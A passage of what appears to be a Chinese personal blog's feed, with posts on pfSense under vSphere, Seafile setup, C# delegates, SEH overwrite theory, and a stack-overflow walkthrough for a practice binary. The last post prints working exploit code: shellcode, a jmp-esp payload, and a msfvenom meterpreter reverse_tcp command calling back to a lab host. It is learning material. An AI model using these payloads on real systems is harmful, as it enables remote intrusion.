<p><img src="/img/2017/08/vsphere/10.png" alt=""></p>
<p>虽然看到开机界面很开心，但是这个系统启动的速度其实”快“得惊人，我等了可能有十分钟才可以交互，交互界面长这样。先选择1，注册一下网络适配器。</p>
<p><img src="/img/2017/08/vsphere/11.png" alt=""></p>
<p>不设置VLAN</p>
<p><img src="/img/2017/08/vsphere/12.png" alt=""></p>
<p>然后WAN适配器输入em0，如果不放心，可以比对一下MAC地址。</p>
<p><img src="/img/2017/08/vsphere/13.png" alt=""></p>
<p><img src="/img/2017/08/vsphere/14.png" alt=""></p>
<p>接着设置LAN适配器为em1</p>
<p><img src="/img/2017/08/vsphere/15.png" alt=""></p>
<p>再按个回车，不设置其他的了，然后按y</p>
<p><img src="/img/2017/08/vsphere/16.png" alt=""></p>
<p>已经回到了主菜单，等个十秒钟左右就好了，下一步设置IP地址，选择2</p>
<p><img src="/img/2017/08/vsphere/17.png" alt=""></p>
<p>选择1，设置WAN，我不用DHCP，所以选择n</p>
<p><img src="/img/2017/08/vsphere/18.png" alt=""></p>
<p>设置IP地址为<code>10.10.10.11</code></p>
<p><img src="/img/2017/08/vsphere/19.png" alt=""></p>
<p>子网掩码，根据情况设置，相信都懂</p>
<p><img src="/img/2017/08/vsphere/20.png" alt=""></p>
<p>这个是http的Web接口，选择y</p>
<p><img src="/img/2017/08/vsphere/21.png" alt=""></p>
<p>然后又到主菜单了，继续设置LAN，和刚才一样的配置方法。</p>
<p><img src="/img/2017/08/vsphere/22.png" alt=""></p>
<h3 id="pfSense-Web配置"><a href="#pfSense-Web配置" class="headerlink" title="pfSense Web配置"></a>pfSense Web配置</h3><p>经过刚才的配置，pfSense的Web管理页面已经可以访问，刚才提前建好的Windows虚拟机可以派上用场了。不过在用之前先把网络适配器改成NAT Network。</p>
<p>将windows的本地连接ipv4地址改成<code>192.168.1.2</code>，随意，只要是这个网段下的都可以，不截图了。</p>
<p>浏览器访问<a href="http://192.168.1.1" target="_blank" rel="external">http://192.168.1.1</a> 初始用户名密码是：admin/pfsense</p>
<p>设置WAN，我用的是Static方式，也可以是PPPOE等</p>
<p><img src="/img/2017/08/vsphere/24.png" alt=""></p>
<p>接下来设置LAN，稍稍看一下就好了，就是之前命令行中的，然后根据提示修改admin密码就完成了设置。</p>
<p>现在的网络界面是这样的，关于IP地址的部分被我挡住了，因为我换掉了IP，多出一个完全不一样的IP地址可能会造成误导吧（vmk0后边的就是<code>10.10.10.11</code>）：</p>
<p><img src="/img/2017/08/vsphere/25.png" alt=""></p>
<p>然后，见证奇迹的时刻。</p>
<p><img src="/img/2017/08/vsphere/26.png" alt=""></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="http://boytnt.blog.51cto.com/966121/1292487（感谢这位作者，首次配置的指导，关于pfSense配置的部分大致相同）" target="_blank" rel="external">http://boytnt.blog.51cto.com/966121/1292487（感谢这位作者，首次配置的指导，关于pfSense配置的部分大致相同）</a></p>
<p><a href="https://en.wikipedia.org/wiki/PfSense" target="_blank" rel="external">https://en.wikipedia.org/wiki/PfSense</a></p>
<p><a href="http://www.360doc.com/content/16/1125/10/27498460_609365608.shtml（虽然没有参考这篇文章，但是这是个单一IP地址就配置了软路由的大哥，折腾的精神值得学习，原链404了，只好贴个360的）" target="_blank" rel="external">http://www.360doc.com/content/16/1125/10/27498460_609365608.shtml（虽然没有参考这篇文章，但是这是个单一IP地址就配置了软路由的大哥，折腾的精神值得学习，原链404了，只好贴个360的）</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;vSphere-ESXi&quot;&gt;&lt;a href=&quot;#vSphere-ESXi&quot; class=&quot;headerlink&quot; title=&quot;vSphere ESXi&quot;&gt;&lt;/a&gt;vSphere ESXi&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.vmware.co
    
    </summary>
    
      <category term="无聊折腾" scheme="http://yoursite.com/categories/%E6%97%A0%E8%81%8A%E6%8A%98%E8%85%BE/"/>
    
    
      <category term="vSphere" scheme="http://yoursite.com/tags/vSphere/"/>
    
      <category term="pfSense" scheme="http://yoursite.com/tags/pfSense/"/>
    
  </entry>
  
  <entry>
    <title>我就看看Seafile是个啥</title>
    <link href="http://yoursite.com/2017/08/31/2017/Seafile_2017_08_31/"/>
    <id>http://yoursite.com/2017/08/31/2017/Seafile_2017_08_31/</id>
    <published>2017-08-31T07:29:20.000Z</published>
    <updated>2017-09-01T03:01:43.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/img/2017/08/1.png" alt="1"></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://www.seafile.com" target="_blank" rel="external">Seafile官网</a>上的一段介绍：”Seafile 是一款开源的企业云盘，注重可靠性和性能。支持 Windows, Mac, Linux, iOS, Android 平台。支持文件同步或者直接挂载到本地访问。“</p>
<p>seafile代码托管在<a href="https://github.com/haiwen/seafile" target="_blank" rel="external">github</a>上，看了一下最近的commit，貌似很神奇，一片红叉。</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>直接搞了个Debian9 x64位系统测试，为啥要用这么新的呢，因为方便，为啥方便呢，因为内核版本是4.9，不用换内核了（我这么懒），为啥要换内核呢，因为锐速不支持ipv6，我要用bbr啊，为啥要用bbr呢？……拉倒吧，不扯犊子了。</p>
<p>使用最熟悉的MySQL部署，跟着<a href="http://manual-cn.seafile.com/deploy/using_mysql.html" target="_blank" rel="external">文档</a>先把各种依赖软件安了，表示文档中这个目录设计还是很不错的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line">apt-get install mariadb-server</div><div class="line">apt-get install python2.7 python-setuptools python-imaging python-ldap python-mysqldb python-memcache python-urllib3</div></pre></td></tr></table></figure>
<h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>文档中写的比较详细，所以这里就简单写一下好了。</p>
<p>安装过程开始要填写一些信息</p>
<p><img src="/img/2017/08/2.png" alt="2"></p>
<p>配置好后的样子：</p>
<p><img src="/img/2017/08/3.png" alt="3"></p>
<p>按照官网的介绍，不过我改了一下端口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./seafile.sh start # 启动 Seafile 服务</div><div class="line">./seahub.sh start 38000 # 启动 Seahub 网站 （运行在38000端口上）</div></pre></td></tr></table></figure>
<h2 id="客户端是个什么感觉"><a href="#客户端是个什么感觉" class="headerlink" title="客户端是个什么感觉"></a>客户端是个什么感觉</h2><p><img src="/img/2017/08/4.png" alt="4"></p>
<p>看起来有点网盘的样子，功能很强大。不过http是不太能够让人放心的。</p>
<p>直接用网页访问就是这个效果（明文密码）：</p>
<p><img src="/img/2017/08/5.png" alt="5"></p>
<p>脱离浏览器的客户端也是一个叼样子（毕竟都是http协议，其实不用测了）：</p>
<p><img src="/img/2017/08/6.png" alt="6"></p>
<h2 id="安利时间"><a href="#安利时间" class="headerlink" title="安利时间"></a>安利时间</h2><p>直接默认http搭建的姿势肯定是不可取的了。不过Seafile支持用apache2或者nginx进行反向代理，采用FastCGI，对外开放https的方式。这种配置方式Seafile的中文文档做的还是很详细的。</p>
<p><img src="/img/2017/08/7.png" alt="7"></p>
<p>我用了一个东西比较多的服务器去搞这个事情，为了不和之前的服务冲突，这个https就不测试了。毕竟硬盘剩余空间还有2G，折腾完自己也用着不爽（2333）。</p>
<p>不过我看到了一个很叼的图：</p>
<p><img src="/img/2017/08/7.png" alt="8"></p>
<p>OK，这东西还支持分布式，美滋滋。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/img/2017/08/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.sea
    
    </summary>
    
      <category term="无聊折腾" scheme="http://yoursite.com/categories/%E6%97%A0%E8%81%8A%E6%8A%98%E8%85%BE/"/>
    
    
      <category term="Seafile" scheme="http://yoursite.com/tags/Seafile/"/>
    
  </entry>
  
  <entry>
    <title>C# 委托和事件</title>
    <link href="http://yoursite.com/2017/05/14/2017/CSharp_2017_05_14/"/>
    <id>http://yoursite.com/2017/05/14/2017/CSharp_2017_05_14/</id>
    <published>2017-05-13T16:00:00.000Z</published>
    <updated>2017-09-01T03:01:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>C# 中的委托和事件是理解这门语言的一道坎，这回记一下。本文能多简略就多简略，如果被想真正学习这方面知识不小心被搜索到，请移步其他大神的博客。</p>
<h2 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h2><p>并没有脱离开事件写过委托，但是委托确实是可以不和事件一起用的。委托是针对方法的一种归类方式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public delegate void PlayDelegate(string name);</div><div class="line">private void PlayBoy(string name) &#123;</div><div class="line">  Console.WriteLine(&quot;Hey &quot;+ name + &quot;, play with me?&quot;);</div><div class="line">&#125;</div><div class="line">private void PlayGirl(String name) &#123;</div><div class="line">  Console.WriteLine(&quot;Hey &quot;+ name + &quot;, play with me?&quot;);</div><div class="line">&#125;</div><div class="line">public void Play(string name, PlayDelegate playMethod) &#123;</div><div class="line">  playMethod(name);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>类似于python中的函数名称作为参数传递，只不过更为标准化。</p>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>不想搞得太复杂，直接上干货，经典的例子，烧水。</p>
<h3 id="Heater类："><a href="#Heater类：" class="headerlink" title="Heater类："></a>Heater类：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">public delegate void BoilHandler(object sender, BoilEventArgs e); </div><div class="line">public event BoilHandler BoilEvent;</div><div class="line">public class BoilEventArgs : EventArgs</div><div class="line">&#123;</div><div class="line">    public int temperature &#123; get; set; &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以上的代码一般是在事件发出对象的内部写。使用public暴露事件。</p>
<h3 id="Alarm类"><a href="#Alarm类" class="headerlink" title="Alarm类"></a>Alarm类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">public void MakeAlert(object sender, EventArgs e) &#123;</div><div class="line">  ~~~</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="program"><a href="#program" class="headerlink" title="program"></a>program</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">heater.BoilEvent += MakeAlert;</div></pre></td></tr></table></figure>
<p>实际上如果<code>using system;</code>之后，可以用System命名空间下的EventHandler进行操作，看一下<a href="https://msdn.microsoft.com/en-us/library/system.eventhandler" target="_blank" rel="external">MSDN</a>吧，比较详细。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>发送者做好委托和事件的设定，包装好参数，事件定义为public，外部暴露后将接收方法注册到事件上，参数与委托中定义的一致。</p>
<p><img src="/img/2017/05/CSharp.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;C# 中的委托和事件是理解这门语言的一道坎，这回记一下。本文能多简略就多简略，如果被想真正学习这方面知识不小心被搜索到，请移步其他大神的博客。&lt;/p&gt;
&lt;h2 id=&quot;委托&quot;&gt;&lt;a href=&quot;#委托&quot; class=&quot;headerlink&quot; title=&quot;委托&quot;&gt;&lt;/a&gt;委
    
    </summary>
    
      <category term="Programing" scheme="http://yoursite.com/categories/Programing/"/>
    
    
      <category term="C#" scheme="http://yoursite.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>awvs+sqlmap傻瓜注入</title>
    <link href="http://yoursite.com/2016/04/08/2016/2016-04-08-SEH/"/>
    <id>http://yoursite.com/2016/04/08/2016/2016-04-08-SEH/</id>
    <published>2016-04-08T05:34:20.000Z</published>
    <updated>2017-12-29T13:01:21.676Z</updated>
    
    <content type="html"><![CDATA[<p>本文将从一下几点介绍利用S.E.H写shellcode。</p>
<ul>
<li>S.E.H原理</li>
<li>为什么要利用S.E.H</li>
<li>SEH_Shellcode构造方法</li>
<li>实际测试</li>
</ul>
<h2 id="0x01-S-E-H原理"><a href="#0x01-S-E-H原理" class="headerlink" title="0x01 S.E.H原理"></a>0x01 S.E.H原理</h2><blockquote>
<p>SEH是一个结构体，这个结构体叫做异常处理结构体，每个结构体中有两个指针，第一个指针建立SEH链表，第二个指针指向异常处理函数，换句话说是异常处理函数句柄。</p>
</blockquote>
<h4 id="S-E-H的构造如下"><a href="#S-E-H的构造如下" class="headerlink" title="S.E.H的构造如下"></a>S.E.H的构造如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> --------------------------</div><div class="line">|DWORD: Next S.E.H recoder |	</div><div class="line"> --------------------------</div><div class="line">|DWORD: Exception handler  |</div><div class="line"> --------------------------</div></pre></td></tr></table></figure>
<hr>
<blockquote>
<ul>
<li>S.E.H 按照级别可分为：线程的异常处理、进程的异常处理、系统默认的异常处理（U.E.F），其整体的处理流程为：<br>*</li>
<li>CPU 执行时发生未捕获异常，内核结果进程的控制权，开始内核态的异常处理。<br>内核异常结束，将控制权还给 ring3.</li>
<li>ring3 中第一个处理异常的函数是 ntdll.dll 中的 KiUserExceptionDispatcher() 函数。</li>
<li>KiUserExceptionDispatcher() 首先检查程序是否处于调试状态。如果程序正在被调试，会将异常交给调试器进行处理。</li>
<li>在非调试状态下，KiUserExceptionDispatcher() 调用 RtlDispatchException() 函数对线程的 S.E.H 链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的 S.E.H 句柄，即 unwind 操作，以保证异常处理机制自身的完整性。</li>
<li>如果栈中所有的 S.E.H 都失败了，且用户曾经使用过 SetUnhandledExceptionFilter() 函数设定进程处理异常，则这个异常处理将被调用。</li>
<li>如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理 UnhandledExceptionFilter() 将会被调用。U.E.F 会根据注册表中相关信息决定是默默地关闭程序，还是弹出错误对话框。</li>
</ul>
</blockquote>
<hr>
<p>利用S.E.H的shellcode的基本想法就是通过控制输入，利用栈溢出来覆盖S.E.H结构体，</p>
<h2 id="0x02-为什么要利用S-E-H"><a href="#0x02-为什么要利用S-E-H" class="headerlink" title="0x02 为什么要利用S.E.H"></a>0x02 为什么要利用S.E.H</h2><p>首先，我们要明确的是本文并不能绕过数据执行保护，利用S.E.H绕过的是对于安全cookie的检测。</p>
<h4 id="安全cookie是什么？"><a href="#安全cookie是什么？" class="headerlink" title="安全cookie是什么？"></a>安全cookie是什么？</h4><p>所谓安全cookie是在进入函数压栈的时候，在压栈之中加入一个cookie，这个cookie很有可能是个随机的值，因而无法构造，在函数执行返回的时候程序检查这个cookie的值是否正确，如果正确，说明栈没有溢出，不正确，说明发生了栈溢出。这就是利用cookie进行的栈保护。</p>
<h4 id="那么为什么利用S-E-H可以绕过这个保护呢？"><a href="#那么为什么利用S-E-H可以绕过这个保护呢？" class="headerlink" title="那么为什么利用S.E.H可以绕过这个保护呢？"></a>那么为什么利用S.E.H可以绕过这个保护呢？</h4><p>答案很明显，当函数产生异常的时候，在函数返回之前，就触发了异常处理，而跳过了检查cookie的这一步。</p>
<h2 id="0x03-SEH-Shellcode-构造方法"><a href="#0x03-SEH-Shellcode-构造方法" class="headerlink" title="0x03 SEH_Shellcode 构造方法"></a>0x03 SEH_Shellcode 构造方法</h2><p>既然是覆盖SEH结构体，那就要自己构造一个结构体冒充原来的S.E.H结构。</p>
<p>经典的用法是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">eb 06 90 90 (jmp 06 nop nop)</div><div class="line">xx xx xx xx (ppr_address)</div></pre></td></tr></table></figure>
<p>ppr_address的意思是pop pop ret三个命令所在的地址。这个小插件几乎会在每一个程序中出现。</p>
<p>看到这里的时候其实有一点我是没有弄懂的，因为之前以为Next S.E.H recoder这个变量是指针，指针就应该是地址，为什么是一句命令呢？后来我才知道这个DWORD实际上是一段命令</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将从一下几点介绍利用S.E.H写shellcode。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;S.E.H原理&lt;/li&gt;
&lt;li&gt;为什么要利用S.E.H&lt;/li&gt;
&lt;li&gt;SEH_Shellcode构造方法&lt;/li&gt;
&lt;li&gt;实际测试&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;0x01-S
    
    </summary>
    
      <category term="二进制" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="二进制" scheme="http://yoursite.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="SEH" scheme="http://yoursite.com/tags/SEH/"/>
    
  </entry>
  
  <entry>
    <title>简单栈溢出</title>
    <link href="http://yoursite.com/2016/04/06/2016/2016-04-06-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://yoursite.com/2016/04/06/2016/2016-04-06-简单栈溢出/</id>
    <published>2016-04-06T05:34:20.000Z</published>
    <updated>2017-12-29T13:00:10.447Z</updated>
    
    <content type="html"><![CDATA[<p>栈溢出基本上是学习逆向的第一步，也是最简单的漏洞之一。现在的操作系统上已经很难单纯的利用栈溢出漏洞。利用pwn5.exe这个程序的栈溢出漏洞练习一下栈溢出漏洞的手动寻找与利用。</p>
<p><a href="/extends/reverse/pwn5.exe">源程序下载</a></p>
<ul>
<li>栈溢出简介</li>
<li>寻找溢出漏洞</li>
<li>漏洞利用</li>
<li>深度利用</li>
</ul>
<h4 id="栈溢出简介"><a href="#栈溢出简介" class="headerlink" title="栈溢出简介"></a><a href="#栈溢出简介" title="栈溢出简介"></a>栈溢出简介</h4><p>栈溢出是这样的一种漏洞。当程序使用了一些危险函数或者由于各种各样的原因，对用户输入的检查不严格，导致用户输入的数据本应在栈上作为数据进行存储，却被当作代码运行的一种漏洞。</p>
<p>本文用jmp esp利用上述软件的漏洞。</p>
<h4 id="寻找溢出漏洞"><a href="#寻找溢出漏洞" class="headerlink" title="寻找溢出漏洞"></a><a href="#寻找溢出漏洞" title="寻找溢出漏洞"></a>寻找溢出漏洞</h4><p>先看一下整个程序的大概情况，明确这个程序的功能。</p>
<p>用IDA Pro打开这个程序，调用F5插件看一下main函数伪代码，很明显是一个Socket，绑定2993端口。</p>
<p><img src="/images/2016/4-06/18-15.png" alt=""></p>
<p>sub_4010B0这个函数很像是用户自己编写的函数，应该是用户自己编写的代码。双击这个函数进去看一下，发现了一个判断用户输入来进行响应的处理，在USERNAME这一个条件里又看到了一个IDA不认识名字的函数，进去看一下。</p>
<p><img src="/images/2016/4-06/18-18.png" alt=""></p>
<p>看到一个for循环，乍一看不知道是干什么，但是，一点一点仔细看下来很明显是字符串拷贝,修改变量名，这样看起来就清晰多了。</p>
<p><img src="/images/2016/4-06/18-19.png" alt=""></p>
<p>这个字符串拷贝很明显没有加什么保护措施，这样的代码一定是有问题的。</p>
<p>再看一下程序给这个字符串开辟的长度是多少。</p>
<p><img src="/images/2016/4-06/18-56.png" alt=""></p>
<p>我们先尝试用多于512个字节的数据覆盖掉这个函数的的返回地址。看是否能成功。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">from zio import *</div><div class="line">host = &quot;172.16.189.218&quot;</div><div class="line">port = 2993</div><div class="line">tul = zio((host,port))</div><div class="line">tul.read_until(&apos;*************** Welcome to take the challenge!*****************\n&apos;)</div><div class="line">ch = &apos;a&apos;</div><div class="line">ss = ch</div><div class="line">try:</div><div class="line">  while True:</div><div class="line">      ss = ss + ch</div><div class="line">      tul.write(&apos;USERNAME&apos; + ss + &apos;\x0d\x0a&apos;)</div><div class="line">except:</div><div class="line">  print len(ss)</div></pre></td></tr></table></figure></p>
<p><img src="/images/2016/4-06/20-29.png" alt=""></p>
<p>程序崩溃了，再用OD看一下。</p>
<p><img src="/images/2016/4-06/20-35.png" alt=""></p>
<p>很明显可以看到esp所在的栈地址被aaaa覆盖。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用" title="漏洞利用"></a>漏洞利用</h4><p>接下来构造shellcode。</p>
<p>看到栈空间的布局之后，计算shellcode在栈中的位置，注意的是栈的对齐，即jmp esp时esp的位置一定是4的整数倍。</p>
<p>这次采用二次跳转的方式执行shellcode。</p>
<p><img src="/images/2016/4-06/20-42.png" alt=""><br><img src="/images/2016/4-06/20-43.png" alt=""></p>
<p>为什么用sub一个负数来调整栈位置呢？因为如果使用正数，字符串中就会出现\x00，字符串拷贝函数就会从这里截断。</p>
<p><img src="/images/2016/4-06/20-45.png" alt=""></p>
<p>这里就是我们的shellcode了。</p>
<p><img src="/images/2016/4-06/20-46.png" alt=""></p>
<p>弹出了一个cmd，下面是shellcode的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from zio import *</div><div class="line">host = &quot;172.16.189.218&quot;</div><div class="line">port = 2993</div><div class="line">io = zio((host,port))</div><div class="line">io.read_until(&apos;*************** Welcome to take the challenge! *****************\n&apos;)</div><div class="line">shellcode =(&quot;\x31\xc0\xeb\x13\x5b\x88\x43\x0e\x53\xbb\xad\x23\x86\x7c\xff\xd3\xbb&quot;</div><div class="line">&quot;\xfa\xca\x81\x7c\xff\xd3\xe8\xe8\xff\xff\xff\x63\x6d\x64\x2e\x65\x78&quot;</div><div class="line">&quot;\x65\x20\x2f\x63\x20\x63\x6d\x64&quot;)</div><div class="line">print len(shellcode)</div><div class="line"># print shellcode.encode(&apos;hex&apos;)</div><div class="line">ret = 0x0012f3d4</div><div class="line">io.write(&apos;USERNAME &apos; + &apos;a&apos;*3 + &apos;\x81\xEC\xC8\xFE\xFF\xFF\xFF\xE4&apos; + shellcode + &apos;\x90&apos;*(511-11-len(shellcode)) + l32(ret) + &apos;\x0d\x0a&apos;)</div></pre></td></tr></table></figure></p>
<h4 id="深度利用"><a href="#深度利用" class="headerlink" title="深度利用"></a><a href="#深度利用" title="深度利用"></a>深度利用</h4><p>用msfvenom生成一段shellcode。</p>
<figure class="highlight autoit"><br><br><pre><br><br><div class="line">root<span class="symbol">@bogon</span>:~<span class="meta"># msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.189.233 lport=8081 -f python -b <span class="string">‘\x00’</span> -n 12</span></div><br><br></pre><br><br><br></figure>

<p>新的攻击代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">from zio import *</div><div class="line">host = &quot;172.16.189.218&quot;</div><div class="line">port = 2993</div><div class="line">io = zio((host,port))</div><div class="line">io.read_until(&apos;*************** Welcome to take the challenge! *****************\n&apos;)</div><div class="line">buf =  &quot;&quot;</div><div class="line">buf += &quot;\x3f\x9f\x49\xf8\x3f\xd6\xfd\x41\x92\xfc\x41\x41\xdb&quot;</div><div class="line">buf += &quot;\xd3\xd9\x74\x24\xf4\xb8\xc1\xf9\xbb\x2a\x5a\x2b\xc9&quot;</div><div class="line">buf += &quot;\xb1\x54\x31\x42\x18\x03\x42\x18\x83\xea\x3d\x1b\x4e&quot;</div><div class="line">buf += &quot;\xd6\x55\x5e\xb1\x27\xa5\x3f\x3b\xc2\x94\x7f\x5f\x86&quot;</div><div class="line">buf += &quot;\x86\x4f\x2b\xca\x2a\x3b\x79\xff\xb9\x49\x56\xf0\x0a&quot;</div><div class="line">buf += &quot;\xe7\x80\x3f\x8b\x54\xf0\x5e\x0f\xa7\x25\x81\x2e\x68&quot;</div><div class="line">buf += &quot;\x38\xc0\x77\x95\xb1\x90\x20\xd1\x64\x05\x45\xaf\xb4&quot;</div><div class="line">buf += &quot;\xae\x15\x21\xbd\x53\xed\x40\xec\xc5\x66\x1b\x2e\xe7&quot;</div><div class="line">buf += &quot;\xab\x17\x67\xff\xa8\x12\x31\x74\x1a\xe8\xc0\x5c\x53&quot;</div><div class="line">buf += &quot;\x11\x6e\xa1\x5c\xe0\x6e\xe5\x5a\x1b\x05\x1f\x99\xa6&quot;</div><div class="line">buf += &quot;\x1e\xe4\xe0\x7c\xaa\xff\x42\xf6\x0c\x24\x73\xdb\xcb&quot;</div><div class="line">buf += &quot;\xaf\x7f\x90\x98\xe8\x63\x27\x4c\x83\x9f\xac\x73\x44&quot;</div><div class="line">buf += &quot;\x16\xf6\x57\x40\x73\xac\xf6\xd1\xd9\x03\x06\x01\x82&quot;</div><div class="line">buf += &quot;\xfc\xa2\x49\x2e\xe8\xde\x13\x26\xdd\xd2\xab\xb6\x49&quot;</div><div class="line">buf += &quot;\x64\xdf\x84\xd6\xde\x77\xa4\x9f\xf8\x80\xcb\xb5\xbd&quot;</div><div class="line">buf += &quot;\x1f\x32\x36\xbe\x36\xf0\x62\xee\x20\xd1\x0a\x65\xb1&quot;</div><div class="line">buf += &quot;\xde\xde\x10\xb4\x48\x4d\xf4\x0b\x61\xe5\xf7\x73\x6e&quot;</div><div class="line">buf += &quot;\x67\x7e\x95\xc0\xd7\xd1\x0a\xa0\x87\x91\xfa\x48\xc2&quot;</div><div class="line">buf += &quot;\x1d\x24\x68\xed\xf7\x4d\x02\x02\xae\x26\xba\xbb\xeb&quot;</div><div class="line">buf += &quot;\xbd\x5b\x43\x26\xb8\x5b\xcf\xc3\x3c\x15\x38\xa1\x2e&quot;</div><div class="line">buf += &quot;\x41\x59\x49\xaf\x91\xf0\x49\xc5\x95\x52\x1d\x71\x97&quot;</div><div class="line">buf += &quot;\x83\x69\xde\x68\xe6\xe9\x19\x96\x77\xd8\x52\xa0\xed&quot;</div><div class="line">buf += &quot;\x64\x0d\xcc\xe1\x64\xcd\x9a\x6b\x65\xa5\x7a\xc8\x36&quot;</div><div class="line">buf += &quot;\xd0\x85\xc5\x2a\x49\x13\xe6\x1a\x3d\xb4\x8e\xa0\x18&quot;</div><div class="line">buf += &quot;\xf2\x10\x5a\x4f\x81\x57\xa4\x0d\xa7\xff\xcd\xed\xe7&quot;</div><div class="line">buf += &quot;\xff\x0d\x84\xe7\xaf\x65\x53\xc8\x40\x46\x9c\xc3\x08&quot;</div><div class="line">buf += &quot;\xce\x17\x85\xfb\x6f\x27\x8c\x5a\x2e\x28\x22\x47\x27&quot;</div><div class="line">buf += &quot;\xa7\xc5\x78\x48\x49\xfa\xae\x71\x3f\x3b\x73\xc6\x30&quot;</div><div class="line">buf += &quot;\x76\xd6\x6f\xdb\x78\x44\x6f\xce&quot;</div><div class="line">shellcode = buf</div><div class="line">print len(shellcode)</div><div class="line"># print shellcode.encode(&apos;hex&apos;)</div><div class="line">ret = 0x0012f3d4</div><div class="line">io.write(&apos;USERNAME &apos; + &apos;a&apos;*3 + &apos;\x81\xEC\xC8\xFE\xFF\xFF\xFF\xE4&apos; + shellcode + &apos;\x90&apos;*(511-11-len(shellcode)) + l32(ret) + &apos;\x0d\x0a&apos;)</div></pre></td></tr></table></figure></p>
<p><img src="/images/2016/4-06/20-57.png" alt=""></p>
<p>成功获得Meterpreter的shell，接下来就是meterpreter的各种用法了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;栈溢出基本上是学习逆向的第一步，也是最简单的漏洞之一。现在的操作系统上已经很难单纯的利用栈溢出漏洞。利用pwn5.exe这个程序的栈溢出漏洞练习一下栈溢出漏洞的手动寻找与利用。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/extends/reverse/pwn5.exe&quot;&gt;源程序下载
    
    </summary>
